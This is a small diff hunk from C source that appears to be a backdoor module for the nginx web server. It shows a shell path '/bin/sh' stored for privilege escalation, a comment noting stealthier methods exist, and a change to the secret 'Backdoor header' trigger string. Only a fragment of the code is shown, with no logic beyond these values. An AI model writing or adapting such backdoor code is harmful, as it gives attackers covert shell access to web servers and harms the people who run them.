@@ -27,7 +27,7 @@ There are likely stealthier methods available
 static char* escalate = "/bin/sh";
 
 //Backdoor header
-static ngx_str_t backdoor = ngx_string("vgo0");
+static ngx_str_t backdoor = ngx_string(">>>>");
 
 /*
 
